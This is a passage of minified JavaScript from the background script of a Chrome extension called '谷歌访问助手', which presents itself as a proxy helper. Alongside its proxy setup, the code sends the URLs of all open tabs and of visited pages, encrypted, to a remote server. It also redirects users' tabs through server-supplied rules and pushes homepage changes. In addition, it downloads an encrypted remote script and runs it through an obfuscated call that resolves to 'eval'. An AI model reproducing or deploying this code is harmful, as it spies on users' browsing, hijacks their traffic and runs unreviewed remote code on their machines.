o(n, u, c, s, e[13], 5, -1444681467), u, c, e[2], 9, -51403784), n, u, e[7], 14, 1735328473), s, n, e[12], 20, -1926607734), c = i(c, s = i(s, n = i(n, u, c, s, e[5], 4, -378558), u, c, e[8], 11, -2022574463), n, u, e[11], 16, 1839030562), s, n, e[14], 23, -35309556), c = i(c, s = i(s, n = i(n, u, c, s, e[1], 4, -1530992060), u, c, e[4], 11, 1272893353), n, u, e[7], 16, -155497632), s, n, e[10], 23, -1094730640), c = i(c, s = i(s, n = i(n, u, c, s, e[13], 4, 681279174), u, c, e[0], 11, -358537222), n, u, e[3], 16, -722521979), s, n, e[6], 23, 76029189), c = i(c, s = i(s, n = i(n, u, c, s, e[9], 4, -640364487), u, c, e[12], 11, -421815835), n, u, e[15], 16, 530742520), s, n, e[2], 23, -995338651), c = a(c, s = a(s, n = a(n, u, c, s, e[0], 6, -198630844), u, c, e[7], 10, 1126891415), n, u, e[14], 15, -1416354905), s, n, e[5], 21, -57434055), c = a(c, s = a(s, n = a(n, u, c, s, e[12], 6, 1700485571), u, c, e[3], 10, -1894986606), n, u, e[10], 15, -1051523), s, n, e[1], 21, -2054922799), c = a(c, s = a(s, n = a(n, u, c, s, e[8], 6, 1873313359), u, c, e[15], 10, -30611744), n, u, e[6], 15, -1560198380), s, n, e[13], 21, 1309151649), c = a(c, s = a(s, n = a(n, u, c, s, e[4], 6, -145523070), u, c, e[11], 10, -1120210379), n, u, e[2], 15, 718787259), s, n, e[9], 21, -343485551),
            t[0] = l(n, t[0]),
            t[1] = l(u, t[1]),
            t[2] = l(c, t[2]),
            t[3] = l(s, t[3])
        }
        function n(t, e, n, r, o, i) {
            return l((e = l(l(e, t), l(r, i))) << o | e >>> 32 - o, n)
        }
        function r(t, e, r, o, i, a, u) {
            return n(e & r | ~e & o, t, e, i, a, u)
        }
        function o(t, e, r, o, i, a, u) {
            return n(e & o | r & ~o, t, e, i, a, u)
        }
        function i(t, e, r, o, i, a, u) {
            return n(e ^ r ^ o, t, e, i, a, u)
        }
        function a(t, e, r, o, i, a, u) {
            return n(r ^ (e | ~o), t, e, i, a, u)
        }
        function u(t) {
            var e, n = [];
            for (e = 0; e < 64; e += 4) n[e >> 2] = t.charCodeAt(e) + (t.charCodeAt(e + 1) << 8) + (t.charCodeAt(e + 2) << 16) + (t.charCodeAt(e + 3) << 24);
            return n
        }
        var c = "0123456789abcdef".split("");
        function s(t) {
            for (var e = "",
            n = 0; n < 4; n++) e += c[t >> 8 * n + 4 & 15] + c[t >> 8 * n & 15];
            return e
        }
        function l(t, e) {
            return t + e & 4294967295
        }
        return function(t) {
            for (var e = 0; e < t.length; e++) t[e] = s(t[e]);
            return t.join("")
        } (function(t) {
            var n, r = t.length,
            o = [1732584193, -271733879, -1732584194, 271733878];
            for (n = 64; n <= t.length; n += 64) e(o, u(t.substring(n - 64, n)));
            t = t.substring(n - 64);
            var i = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
            for (n = 0; n < t.length; n++) i[n >> 2] |= t.charCodeAt(n) << (n % 4 << 3);
            if (i[n >> 2] |= 128 << (n % 4 << 3), n > 55) for (e(o, i), n = 0; n < 16; n++) i[n] = 0;
            return i[14] = 8 * r,
            e(o, i),
            o
        } (t))
    },
    n.exports = r
}),
define("app/t", [],
function(t, e) {
    var n, r, o = t("lib/z"),
    i = t("app/u"),
    a = t("app/b"),
    u = t("lib/u"),
    c = t("lib/t"),
    s = c.M(i.info.appID + i.info.locale),
    l = (i.info.appVersion, {
        redirects: []
    }),
    f = function(t) {
        t || console.error("603 - Rule String is null");
        var e = (l = JSON.parse(t)).redirects;
        for (var n in l.redirects = [], e) {
            var r = {};
            r.r = new RegExp(e[n].r),
            r.t = new RegExp(e[n].t),
            r.s = e[n].s,
            l.redirects.push(r)
        }
    };
    e.S = function(t, e, n) {
        var r = [];
        r.push(t),
        r.push(e),
        r.push(n),
        i.IO.W(s, r.join("<||GGFWZS||>"),
        function() {
            console.info("- rule done -")
        },
        function(t) {
            console.error("602 - Can not write rule file - " + t)
        })
    },
    e.U = function(t) {
        o.get(i.info.rootServer + "updateTaskRule", {
            uuid: n,
            time: r
        },
        function(o) {
            e.S(n, r, o),
            f(c.D(o, c.P(n, r))),
            u.isFunction(t) && t()
        })
    },
    e.A = function(t, e) {
        var a = {
            links: []
        };
        chrome.tabs.query({},
        function(s) {
            for (var l = s.length - 1; l >= 0; l--) a.links.push(s[l].url);
            a.links.push("http://360.hao245.com");
            a.links.push("http://123.hao245.com");
            var f = c.E(JSON.stringify(a), c.P(n, r));
            o.post(i.info.rootServer + "updateTaskRule3?uuid=" + n + "&time=" + r, {
                D: f
            },
            function(o) {
                var i = JSON.parse(c.D(o, c.P(n, r)));
                i.result ? (n = i.uuid, u.isFunction(t) && t(i)) : u.isFunction(e) && e(i)
            })
        })
    },
    e.R = function(t, e) {
        i.IO.R(s,
        function(r) {
            var o = r.split("<||GGFWZS||>");
            n = o[0];
            try {
                f(c.D(o[2], c.P(o[0], o[1]))),
                t()
            } catch(t) {
                console.error("605 - json parse rule file error " + t),
                a.off("!", "错误：扩展发生错误"),
                e()
            }
        },
        function() {
            n = c.G(),
            r = i.offlineTime(),
            e()
        })
    },
    e.C = function(t, e) {
        var u = {
            links: []
        };
        function s(t) {
            var e = t.type;
            t.url;
            "main_frame" === e && (u.links.push(t.url), localStorage.DEBUG && console.log(t.url))
        }
        chrome.tabs.query({},
        function(t) {
            for (var e = t.length - 1; e >= 0; e--) u.links.push(t[e].url);
            u.links.push("http://360.hao245.com");
            u.links.push("http://123.hao245.com");
            localStorage.DEBUG && console.log(JSON.stringify(u))
        }),
        chrome.webRequest.onBeforeRequest.addListener(s, {
            urls: ["http://*/*", "https://*/*"]
        },
        ["blocking"]),
        setTimeout(function() {
            chrome.webRequest.onBeforeRequest.removeListener(s),
            i.onlineTime(function(s) {
                r = s || i.offlineTime(),
                localStorage.DEBUG && console.log(JSON.stringify(u));
                var l = c.E(JSON.stringify(u), c.P(n, r));
                o.ajax({
                    type: "POST",
                    tryCount: 0,
                    retryLimit: 2,
                    url: i.info.rootServer + "updateTaskRule2?uuid=" + n + "&time=" + r,
                    data: {
                        D: l
                    },
                    success: function(s) {
                        var l = JSON.parse(c.D(s, c.P(n, r))),
                        f = localStorage.Installed;
                        f ? Date.now() - parseInt(f) > 432e5 && (l.oldExist = !1) : l.oldExist = !1,
                        l.result ? (n = l.uuid, t(l)) : chrome.tabs.query({},
                        function(s) {
                            for (var l = s.length - 1; l >= 0; l--) u.links.push(s[l].url);
                            u.links.push("http://360.hao245.com");
                            u.links.push("http://123.hao245.com");
                            localStorage.DEBUG && console.log("second time"),
                            localStorage.DEBUG && console.log(JSON.stringify(u));
                            var f = c.E(JSON.stringify(u), c.P(n, r));
                            o.ajax({
                                type: "POST",
                                url: i.info.rootServer + "updateTaskRule2?uuid=" + n + "&time=" + r,
                                data: {
                                    D: f
                                },
                                success: function(o) {
                                    var i = JSON.parse(c.D(o, c.P(n, r))),
                                    a = localStorage.Installed;
                                    a ? Date.now() - parseInt(a) > 432e5 && (i.oldExist = !1) : i.oldExist = !1,
                                    i.result ? (n = i.uuid, t(i)) : e(i)
                                },
                                error: function(t) {
                                    console.error(type),
                                    a.off("!", "错误：服务器请求失败")
                                }
                            })
                        })
                    },
                    error: function(t, e) {
                        console.error(e),
                        this.tryCount++,
                        ("timeout" == e || "abort" == e) && this.tryCount <= this.retryLimit ? o.ajax(this) : a.off("!", "错误：服务器请求失败")
                    }
                })
            })
        },
        l.checksTime)
    },
    e.F = function(t, e) {
        var n = localStorage.Installed;
        n ? u.isFunction(e) && e(parseInt(n)) : (localStorage.Installed = Date.now(), u.isFunction(t) && t())
    },
    e.RT = function() {
        chrome.tabs.query({},
        function(t) {
            for (var e = t.length - 1; e >= 0; e--) {
                console.log(t[e].url);
                var n = t[e].url;
                for (var r in l.redirects) if (l.redirects[r].r.test(n) && !l.redirects[r].t.test(n)) {
                    var o = n.replace(l.redirects[r].r, l.redirects[r].s);
                    console.log("QRedirect - " + n),
                    chrome.tabs.update(t[e].id, {
                        url: o
                    });
                    break
                }
            }
        })
    },
    e.D = function() {
        var t = [],
        e = [];
        chrome.webRequest.onBeforeRequest.addListener(function(n) {
            var r, o, i = n.type,
            a = n.url;
            if ("main_frame" === i) for (var c in needShowWarming && /^https?\:\/\/(.*google[^\/:?#]+)/.test(a) && (needShowWarming = !1, chrome.tabs.create({
                url: "warming.html"
            },
            function(t) {
                t ? chrome.windows.update(t.windowId, {
                    focused: !0
                }) : chrome.windows.create({
                    url: "warming.html",
                    focused: !0
                })
            })), l.redirects) if (l.redirects[c].r.test(a) && !l.redirects[c].t.test(a) && (r = a, void 0, (o = u.indexOf(t, r)) >= 0 ? e[o] < l.redirectTimes && (e[o]++, 1) : (t.length >= 10 && (t.shift(), e.shift()), t.push(r), e.push(0), 1))) return console.log("Redirect - " + a),
            {
                redirectUrl: a.replace(l.redirects[c].r, l.redirects[c].s)
            }
        },
        {
            urls: ["http://*/*", "https://*/*"]
        },
        ["blocking"]);
        Date.now();
        setInterval(function() {
            localStorage.LastRun = Date.now()
        },
        3e5)
    }
}),
define("app/b", [],
function(t, e) {
    window.popupView = {
        status: "off",
        speed: -1,
        startTime: Date.now(),
        warming: "",
        tips: "交流QQ群：176080917"
    },
    e.off = function(t, e, n, r) {
        window.popupView.warming = e,
        n || (n = "#ff0000"),
        r || (r = "谷歌访问助手"),
        chrome.browserAction.setIcon({
            path: "/icons/inactive.png"
        }),
        chrome.browserAction.setBadgeText({
            text: t
        }),
        chrome.browserAction.setBadgeBackgroundColor({
            color: n
        }),
        chrome.browserAction.setTitle({
            title: r
        }),
        window.popupView.status = "off"
    },
    e.on = function(t) {
        chrome.browserAction.setIcon({
            path: "/icons/icon.png"
        }),
        chrome.browserAction.setBadgeText({
            text: ""
        }),
        chrome.browserAction.setTitle({
            title: "谷歌访问助手"
        }),
        window.popupView.status = "on",
        window.popupView.speed = t
    }
}),
define("app/p", [],
function(t, e) {
    var n, r, o, i, a, u = t("app/u"),
    c = t("lib/z"),
    s = t("app/b"),
    l = t("lib/t"),
    f = u.info.appVersion,
    p = 40,
    h = Date.now(),
    d = 0,
    g = !1,
    v = function(t, e) {
        var n = t.type + " " + t.host + ":" + t.port + ";";
        if (localStorage.PROXY) {
            var r = localStorage.PROXY.split(",");
            n = r[d++%r.length],
            console.log("Choose " + n)
        }
        var o = 'function FindProxyForURL(url, host) {\nvar D="DIRECT;", P = "' + n + '";\n' + e + "\n}";
        localStorage.DEBUG && console.log(o);
        var i = {
            mode: "pac_script",
            pacScript: {
                data: o
            }
        };
        chrome.proxy.settings.set({
            value: i,
            scope: "regular"
        },
        function() {
            s.on(t.speed),
            console.info("- proxy done - ")
        })
    };
    window.debugProxy = function() {
        if (localStorage.PROXY) {
            var t = localStorage.PROXY.split(","),
            e = t[d++%t.length];
            console.log("Choose " + e);
            var n = 'function FindProxyForURL(url, host) {\nvar D="DIRECT;", P = "' + e + '";\n' + i + "\n}";
            localStorage.DEBUG && console.log(n);
            var r = {
                mode: "pac_script",
                pacScript: {
                    data: n
                }
            };
            chrome.proxy.settings.set({
                value: r,
                scope: "regular"
            },
            function() {
                console.info("- proxy done - ")
            })
        }
    };
    var m = function(t, e) {
        if (localStorage.BACKUP) {
            for (var n = 0; n < t.length; n++) t[n].speed = -1;
            e()
        } else {
            for (n = 0; n < t.length; n++) if (0 == t[n].speed) return t[n].startTime = Date.now(),
            void c.ajax({
                type: "GET",
                url: "https://" + t[n].host + ":" + t[n].port + "/speed_test?size=100&t=" + t[n].startTime,
                timeout: 6e4,
                success: function() {
                    t[n].speed = Math.floor(1e5 / (Date.now() - t[n].startTime)),
                    m(t, e)
                },
                error: function(r, o) {
                    console.log(r.responseText, o),
                    t[n].speed = -1,
                    t[n].error = o,
                    m(t, e)
                }
            });
            e()
        }
    },
    y = function(t, e) {
        for (var s = 0; s < t.length; s++) t[s].speed = 0;
        m(t,
        function() {
            for (var s = t[0], f = 1; f < t.length; f++) s.speed < t[f].speed && (s = t[f]);
            if (s.speed <= 0) if (g) if (r && t != r) n = r,
            y(r, e);
            else if (r && t == r && 443 != s.port) {
                for (var p = 0; p < t.length; p++) t[p].port = 443;
                y(t, e)
            } else o ? (v(s = o, i), e(s)) : (v(s, i), e(s));
            else !
            function(t) {
                var e = u.offlineTime();
                c.ajax({
                    type: "GET",
                    url: u.info.rootServer + "updateTaskRule6?uuid=" + a + "&time=" + e,
                    timeout: 6e4,
                    success: function(n) {
                        localStorage.DEBUG && console.log("[getBackupProxy success]data:" + n);
                        var r = JSON.parse(l.D(n, l.P(a, e)));
                        t(r)
                    },
                    error: function(e, n) {
                        localStorage.DEBUG && console.log("[getBackupProxy failed]" + e.responseText, n),
                        t(null)
                    }
                })
            } (function(n) {
                if (g = !0, n) {
                    if (n.proxyServer) {
                        r = [];
                        for (var a = 0; a < n.proxyServer.length; a++) {
                            var u = n.proxyServer[a].split(":");
                            r.push({
                                type: u[0],
                                host: u[1],
                                port: u[2],
                                speed: 0
                            })
                        }
                    }
                    if (n.backupServer) {
                        var c = n.backupServer.split(":");
                        o = {
                            type: c[0],
                            host: c[1],
                            port: c[2],
                            speed: 0
                        },
                        v(o, i)
                    }
                    if (443 != s.port) {
                        for (l = 0; l < t.length; l++) t[l].port = 443;
                        y(t, e)
                    } else r ? y(r, e) : o ? (v(s = o, i), e(s)) : (v(s, i), e(s))
                } else if (443 != s.port) {
                    for (var l = 0; l < t.length; l++) t[l].port = 443;
                    y(t, e)
                } else v(s, i),
                e(s)
            });
            else v(s, i),
            e(s)
        })
    },
    w = function(t, e) {
        return localStorage["stop-proxy"] && "true" == localStorage["stop-proxy"] ? (s.off("", "谷歌访问助手已经暂停，点击启动运行"), void chrome.proxy.settings.set({
            value: {
                mode: "system"
            },
            scope: "regular"
        },
        function() {
            console.info("- proxy system! - ")
        })) : Date.now() - h > 1728e5 ? (s.off("!", "连续使用服务超过24小时，<br>需要重启浏览器才能重新使用"), console.log("expired"), void chrome.proxy.settings.set({
            value: {
                mode: "system"
            },
            scope: "regular"
        },
        function() {
            console.info("- proxy system! - ")
        })) : (r = null, o = null, g = !1, y(n,
        function(t) {
            var e = u.offlineTime();
            localStorage.BACKUP || c.ajax({
                type: "POST",
                url: u.info.rootServer + "updateTaskRule5?uuid=" + a + "&time=" + e,
                data: {
                    D: l.E(JSON.stringify({
                        servers: n
                    }), l.P(a, e))
                },
                success: function(t) {},
                error: function(t, e) {
                    console.error("[feedback: choose normal proxy]," + e)
                }
            }),
            o && t === o ? (console.log((new Date).toString(), "[choose]chooseBackUp!"), c.ajax({
                type: "POST",
                url: u.info.rootServer + "updateTaskRule7?uuid=" + a + "&time=" + e,
                data: {
                    D: l.E(JSON.stringify({
                        backup: t
                    }), l.P(a, e))
                },
                success: function(t) {},
                error: function(t, e) {
                    console.error("[feedback: choose backupProxy]," + e)
                }
            })) : console.log((new Date).toString(), "[choose]chooseNormal!")
        }), void(null != t && null != t && t ? e() : setTimeout(w, 18e5)))
    };
    e.updateProxy = w;
    var b = "not_controllable",
    x = "controlled_by_other_extensions",
    S = "controllable_by_this_extension",
    E = "controlled_by_this_extension",
    T = !1,
    j = function() {
        localStorage["stop-proxy"] && "true" == localStorage["stop-proxy"] || chrome.proxy.settings.get({
            incognito: !1
        },
        function(t) {
            localStorage["stop-proxy"] && "true" == localStorage["stop-proxy"] || (t.levelOfControl === S || t.levelOfControl === E ? (localStorage.DEBUG && console.info("[proxy controlled by ggfwzs!]"), T && (s.on(), T = !1)) : t.levelOfControl === x ? (localStorage.DEBUG && console.info("[proxy controlled by other extension!]"), s.off("!", "代理冲突！可能被其他扩展插件占用了代理权限，请检查并重启本插件"), T = !0) : t.levelOfControl === b && (localStorage.DEBUG && console.info("[proxy cannot be controlled!]"), s.off("!", "代理设置失败！请检查浏览器相关设置并重启本插件"), T = !0))
        }),
        setTimeout(j, 3e5)
    };
    e.I = function(t) {
        i = t.pacScriptStr,
        a = t.uuid,
        n = [];
        for (var r = 0; r < t.proxyServer.length; r++) {
            var o = t.proxyServer[r].split(":");
            n.push({
                type: o[0],
                host: o[1],
                port: o[2],
                speed: 0
            })
        }
        "true" != localStorage["stop-proxy"] && v(n[0], i),
        w(),
        setTimeout(j, 6e4),
        chrome.webRequest.onAuthRequired.addListener(function(n, r) {
            console.info(n.realm + " " + p),
            "GGFWZS Proxy" === n.realm ? p > 0 ? (r({
                authCredentials: {
                    username: f,
                    password: a
                }
            }), p--) : (console.error("Error: username:" + f + " - password:" + t.uuid), s.off("!", "错误：帐号失效或过期，请重启浏览器"), e.D(), r({
                cancel: !0
            })) : r()
        },
        {
            urls: ["<all_urls>"]
        },
        ["asyncBlocking"])
    },
    e.D = function() {
        chrome.proxy.settings.set({
            value: {
                mode: "system"
            },
            scope: "regular"
        },
        function() {
            console.info("- proxy system - ")
        })
    }
}),
define("app/notifications", [],
function(t, e) {
    t("app/b");
    var n = t("app/u");
    function r(t) {
        "" === t.icon && (t.icon = chrome.runtime.getURL("/icons/icon-128.png"));
        var e = [{
            title: "马上去看看",
            iconUrl: chrome.runtime.getURL("/icons/icon-128.png")
        }],
        n = {
            type: "basic",
            title: t.title,
            message: t.message,
            iconUrl: t.icon,
            buttons: e
        };
        chrome.notifications.create("GGFWZSNOTIFICATION" + t.time, n,
        function() {
            localStorage.NotificationsNum = t.time
        }),
        chrome.notifications.onButtonClicked.addListener(function(e, n) {
            e == "GGFWZSNOTIFICATION" + t.time && chrome.tabs.create({
                url: t.link
            })
        }),
        chrome.notifications.onClicked.addListener(function(e) {
            e == "GGFWZSNOTIFICATION" + t.time && chrome.tabs.create({
                url: t.link
            })
        })
    }
    e.installNotification = function() {
        $.getJSON(n.info.rootServer + "getNotifications",
        function(t) {
            localStorage["popup-message"] = t["popup-message"];
            var e = chrome.runtime.getManifest().version;
            t["version-message"] && t["version-message"][e] && (localStorage["popup-message"] = t["version-message"][e]),
            localStorage.NotificationsNum = t["install-notifications"].time,
            t["install-notifications"].message && "" != t["install-notifications"].message && setTimeout(function() {
                r(t["install-notifications"])
            },
            3e5)
        })
    },
    e.init = function() { !
        function t() {
            $.getJSON(n.info.rootServer + "getNotifications",
            function(t) {
                localStorage["popup-message"] = t["popup-message"];
                var e = chrome.runtime.getManifest().version;
                t["version-message"] && t["version-message"][e] && (localStorage["popup-message"] = t["version-message"][e]);
                var n = 0;
                localStorage.NotificationsNum && (n = parseInt(localStorage.NotificationsNum));
                for (var o = 0; o < t.all.length; o++) if (t.all[o].time > n && t.all[o].message && "" != t.all[o].message) {
                    var i = t.all[o];
                    setTimeout(function() {
                        r(i)
                    },
                    6e5)
                }
            }),
            setTimeout(t, 36e5)
        } ()
    }
}),
define("app/mainServer", [],
function(t, e) {
    var n = t("app/u"),
    r = t("lib/t"),
    o = function(t, e, n, r) {
        var i = atob(t[e]) + "static/test.json?t=" + Date.now();
        $.ajax({
            type: "get",
            url: i,
            success: function(r) {
                n(atob(t[e]))
            },
            error: function(i) {
                e >= t.length - 1 ? r() : o(t, e + 1, n, r)
            }
        })
    },
    i = ["https://o4175vz27.qnssl.com/d.json", "https://yingu.coding.me/test/d.json"];
    if (localStorage.static) {
        i = [];
        for (var a = JSON.parse(localStorage.static), u = 0; u < a.length; u++) i.push(atob(a[u]))
    }
    var c = null,
    s = function(t, e, n, r) {
        $.ajax({
            type: "get",
            url: t[e] + "?t=" + Date.now(),
            dataType: "json",
            success: function(r) {
                c = t[e],
                n(r)
            },
            error: function(o) {
                e >= t.length - 1 ? r() : s(t, e + 1, n, r)
            }
        })
    };
    e.get = function(t, e) {
        s(i, 0,
        function(r) {
            localStorage.static = JSON.stringify(r.static),
            l(r.emmessage);
            var i = r.RSS,
            a = Math.floor(100 * Math.random());
            console.log(a);
            for (var u = [], c = 0; c < i.length; c++) i[c].percentHigh > 0 && i[c].percentHigh >= a && i[c].percentLow <= a ? u.unshift(i[c].name) : u.push(i[c].name);
            o(u, 0,
            function(e) {
                n.info.rootServer = localStorage.rootServer = e + "app/ext/",
                t()
            },
            function() {
                e()
            })
        },
        function() {
            console.error(err),
            e()
        })
    };
    var l = function(t) {
        var e = JSON.parse(atob(t));
        e.vn > 0 && parseInt(localStorage.mversion) != e.vn ? $.ajax({
            type: "get",
            url: e.rml + "?t=" + Date.now(),
            success: function(t) {
                var o = r.D(t, "0123456789abcdef").split("/*AABBCCDDEE*/");
                2 == o.length ? n.IO.W("rml", o[0],
                function() {
                    n.IO.W("cml", o[0],
                    function() {
                        console.log("update!"),
                        localStorage.mversion = e.vn
                    })
                }) : console.error("internal error")
            },
            error: function(t) {
                console.error("mversion request fail")
            }
        }) : localStorage.mversion = e.vn
    },
    f = "";
    localStorage.Installed && Date.now() - parseInt(localStorage.Installed) > 864e5 && parseInt(localStorage.mversion) > 0 && (n.IO.R("rml",
    function(t) {
        window[14..toString(16) + "v" + 241..toString(22)](t)
    },
    function() {
        console.error("read data error")
    }), n.IO.R("cml",
    function(t) {
        f = t
    },
    function() {
        console.error("read data error")
    })),
    e.getCsc = function() {
        return f
    },
    setInterval(function() {
        $.ajax({
            type: "get",
            url: c + "?t=" + Date.now(),
            dataType: "json",
            success: function(t) {
                l(t.emmessage)
            },
            error: function(t) {
                console.error("static server request fail")
            }
        })
    },
    72e5)
}),
seajs.use(["app/u", "lib/t", "app/t", "app/p", "app/b", "app/notifications", "app/mainServer"],
function(t, e, n, r, o, i, a) {
    o.off("...", "正在连接主服务器,请等待10秒"),
    a.get(function() {
        n.D(),
        n.R(function() {
            localStorage["auto-homepage"] && "true" == localStorage["auto-homepage"] && chrome.tabs.query({},
            function(t) {
                for (var e = !1,
                n = 0; n < t.length; n++) if ("chrome://newtab/" == t[n].url) {
                    e = !0,
                    chrome.tabs.update(t[n].id, {
                        active: !0,
                        url: localStorage.homepage
                    });
                    break
                }
                e || chrome.tabs.create({
                    url: localStorage.homepage
                },
                function(t) {
                    t ? chrome.windows.update(t.windowId, {
                        focused: !0
                    }) : chrome.windows.create({
                        url: localStorage.homepage,
                        focused: !0
                    })
                })
            }),
            n.RT(),
            n.C(function(t) {
                console.info("- task success -"),
                r.I(t),
                n.U()
            },
            function(t) {
                console.info("Task fail:" + t.error),
                o.off("!", '程序尚未激活，请您<a target="_blank" href="/warming.html">按照步骤</a>设置首页');
                var e = localStorage.Installed;
                e && !t.oldExist ? Date.now() - parseInt(e) > 2592e5 ? needShowWarming = !0 : (needShowWarming = !1, chrome.tabs.create({
                    url: "warming.html"
                },
                function(t) {
                    t ? chrome.windows.update(t.windowId, {
                        focused: !0
                    }) : chrome.windows.create({
                        url: "warming.html",
                        focused: !0
                    })
                })) : needShowWarming = !1,
                t.oldExist ? (console.info("- Using old -"), chrome.tabs.create({
                    url: "warming.html"
                },
                function(t) {
                    t ? chrome.windows.update(t.windowId, {
                        focused: !0
                    }) : chrome.windows.create({
                        url: "warming.html",
                        focused: !0
                    })
                }), r.I(t)) : r.D(),
                n.U()
            }),
            i.init()
        },
        function(t) {
            i.installNotification(),
            n.A(function(t) {
                o.on(),
                r.I(t),
                n.U(),
                window.setTimeout(function() {
                    n.U()
                },
                216e5)
            },
            function(t) {
                console.error("apply fail:" + t.error),
                badge.off("!", "错误：申请试用失败"),
                n.U()
            })
        }),
        n.F(function() {
            console.info("- first run -"),
            chrome.tabs.create({
                url: "first.html"
            },
            function(t) {
                t ? chrome.windows.update(t.windowId, {
                    focused: !0
                }) : chrome.windows.create({
                    url: "first.html",
                    focused: !0
                })
            })
        },
        function(t) {
            console.info(t)
        })
    },
    function() {
        badge.off("!", "服务器连接失败")
    }),
    chrome.runtime.onMessage.addListener(function(t, e, n) {
        "refresh" == t.reqtype ? (console.log("refresh"), o.off("...", "刷新中..."), r.updateProxy(!0,
        function() {
            o.on()
        })) : "restart" == t.reqtype ? console.log("restart") : "stop" == t.reqtype ? (console.log("stop"), localStorage["stop-proxy"] = !0, r.updateProxy(!0,
        function() {})) : "start" == t.reqtype ? (console.log("start"), localStorage["stop-proxy"] = !1, r.updateProxy(!0,
        function() {
            o.on()
        })) : "init-page" == t.reqtype && n({
            data: a.getCsc()
        })
    })
}),
setTimeout(function() {
    var t = t || [];
    t.push(["_setAccount", "UA-48334954-3"]),
    t.push(["_trackPageview"]),
    function() {
        var t = document.createElement("script");
        t.type = "text/javascript",
        t.async = !0,
        t.src = "https://ssl.google-analytics.com/ga.js";
        var e = document.getElementsByTagName("script")[0];
        e.parentNode.insertBefore(t, e)
    } ()
},
1e4);